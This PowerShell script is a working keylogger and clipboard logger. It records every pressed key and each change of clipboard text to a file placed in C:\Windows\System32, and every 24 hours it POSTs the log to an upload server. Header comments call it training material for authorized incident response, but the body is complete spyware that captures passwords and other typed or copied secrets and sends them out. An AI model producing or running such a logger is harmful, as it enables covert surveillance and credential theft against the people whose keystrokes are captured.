# Requires admin privileges to write to C:\Windows\System32
# Ensure explicit written consent from all users, stakeholders, and server owner before use
# For authorized incident response training only (e.g., forensic analysis or exfiltration simulation in a controlled environment)

# Configuration
$LogFile = "C:\Windows\System32\Content.txt"  # Path for logging keystrokes and clipboard
$UploadUrl = "http://192.168.0.1/uploads"  # Test server for data upload
$UploadInterval = 24 * 60 * 60  # 24 hours in seconds
$ClipboardCheckInterval = 5  # Seconds between clipboard checks

# Check for admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "Error: This script requires administrative privileges to write to $LogFile."
    exit 1
}

# Load necessary assembly for key detection and clipboard access
Add-Type -AssemblyName System.Windows.Forms

# Initialize last known clipboard content to avoid duplicate logging
$lastClipboardContent = ""

# Function to upload log file to server
function Upload-LogFile {
    try {
        if (Test-Path $LogFile) {
            $logContent = Get-Content -Path $LogFile -Raw
            $params = @{ "log" = $logContent }
            $response = Invoke-WebRequest -Uri $UploadUrl -Method Post -Body $params
            Write-Host "Upload status: $($response.StatusCode)"
        } else {
            Write-Host "Log file $LogFile not found for upload."
        }
    }
    catch {
        Write-Host "Upload failed: $_"
    }
    # Schedule next upload
    $timer = New-Object Timers.Timer
    $timer.Interval = $UploadInterval * 1000  # Convert seconds to milliseconds
    $timer.AutoReset = $true
    Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action { Upload-LogFile } | Out-Null
    $timer.Start()
}

# Function to capture keystrokes and clipboard content
function CaptureKeystrokesAndClipboard {
    while ($true) {
        # Check keystrokes
        for ($keyCode = 0; $keyCode -le 255; $keyCode++) {
            $keyState = [System.Windows.Forms.Control]::IsKeyDown($keyCode)
            if ($keyState) {
                $key = [System.Windows.Forms.Keys]$keyCode
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logEntry = "[$timestamp] Key pressed: $key"
                try {
                    Add-Content -Path $LogFile -Value $logEntry
                }
                catch {
                    Write-Host "Error writing keystroke to $LogFile : $_"
                    exit 1
                }
            }
        }

        # Check clipboard content periodically
        try {
            $currentClipboard = [System.Windows.Forms.Clipboard]::GetText()
            if ($currentClipboard -and $currentClipboard -ne $lastClipboardContent) {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logEntry = "[$timestamp] Clipboard changed: $currentClipboard"
                Add-Content -Path $LogFile -Value $logEntry
                $lastClipboardContent = $currentClipboard
            }
        }
        catch {
            Write-Host "Error accessing clipboard: $_"
        }

        # Sleep to reduce CPU usage
        Start-Sleep -Milliseconds 10
    }
}

# Main execution
try {
    # Clear clipboard to initialize (optional, for testing)
    [System.Windows.Forms.Clipboard]::Clear()
    # Start initial upload schedule
    Upload-LogFile
    # Start capturing keystrokes and clipboard
    CaptureKeystrokesAndClipboard
}
catch {
    Write-Host "Error running logger: $_"
    exit 1
}